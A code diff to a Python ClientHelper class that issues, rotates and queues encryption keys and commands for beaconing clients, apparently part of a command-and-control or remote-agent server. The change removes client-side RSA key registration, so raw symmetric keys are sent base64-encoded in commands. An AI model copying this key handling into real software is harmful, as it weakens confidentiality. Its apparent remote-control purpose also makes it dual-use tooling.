@@ -176,11 +176,6 @@ class ClientHelper:
         Returns:
             dict: Key issuance command object
         """
-        # Check if the client has already registered their own key
-        if self.encryption_service and self.encryption_service.has_client_key(client_id):
-            logger.info(f"Client {client_id} already has a registered key, skipping key issuance")
-            return None
-        
         # Generate a new unique key for this client
         if self.encryption_service:
             new_key = self.encryption_service.generate_key()
@@ -191,7 +186,7 @@ class ClientHelper:
             new_key = os.urandom(32)  # 256-bit key
             # Store in client manager
             self.client_manager.set_client_key(client_id, new_key)
-                
+            
         # Convert to base64 for transmission
         base64_key = base64.b64encode(new_key).decode('utf-8')
         
@@ -213,20 +208,6 @@ class ClientHelper:
         Returns:
             dict: Key rotation command object
         """
-        # Check if the client has already registered their own key
-        # If so, we don't need to rotate it - client will need to re-register
-        if self.encryption_service and self.encryption_service.has_client_key(client_id):
-            logger.info(f"Client {client_id} already has a registered key, requesting re-registration instead")
-            
-            # Request key re-registration instead of rotation
-            key_registration_command = {
-                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "command_type": "key_registration_request",
-                "args": "Please re-register your client key using RSA encryption"
-            }
-            
-            return key_registration_command
-        
         # Generate a new unique key for this client
         if self.encryption_service:
             new_key = self.encryption_service.generate_key()
@@ -237,7 +218,7 @@ class ClientHelper:
             new_key = os.urandom(32)  # 256-bit key
             # Store in client manager
             self.client_manager.set_client_key(client_id, new_key)
-                
+            
         # Convert to base64 for transmission
         base64_key = base64.b64encode(new_key).decode('utf-8')
         
@@ -267,25 +248,19 @@ class ClientHelper:
         commands = []
         has_key_operation = False
         
-        # For first contact, only send a key issuance command if client doesn't support secure key exchange
+        # For first contact, only send a key issuance command
         if first_contact:
-            # Send key issuance command (client will ignore if it successfully registers its own key)
             key_issuance_command = self.prepare_key_issuance(client_id)
-            if key_issuance_command:
-                commands.append(key_issuance_command)
-                has_key_operation = True
-            
-            # The beacon handler will include the server's public key in the response
+            commands.append(key_issuance_command)
+            has_key_operation = True
             return commands, has_key_operation
         
         # Get pending commands for established clients
         commands = self.client_manager.get_pending_commands(client_id)
         
-        # Move any key operation commands to the front
-        key_operation_types = ['key_rotation', 'key_issuance', 'key_registration_request']
-        
+        # Move any key rotation commands to the front
         for i, command in enumerate(commands):
-            if command.get('command_type') in key_operation_types:
+            if command.get('command_type') == 'key_rotation':
                 has_key_operation = True
                 if i > 0:  # Move to front if not already there
                     commands.insert(0, commands.pop(i))
@@ -294,9 +269,8 @@ class ClientHelper:
         # Add key rotation command if needed and not already present
         if include_key_rotation and not has_key_operation:
             key_rotation_command = self.prepare_key_rotation(client_id)
-            if key_rotation_command:
-                commands.insert(0, key_rotation_command)
-                has_key_operation = True
+            commands.insert(0, key_rotation_command)
+            has_key_operation = True
         
         return commands, has_key_operation
     
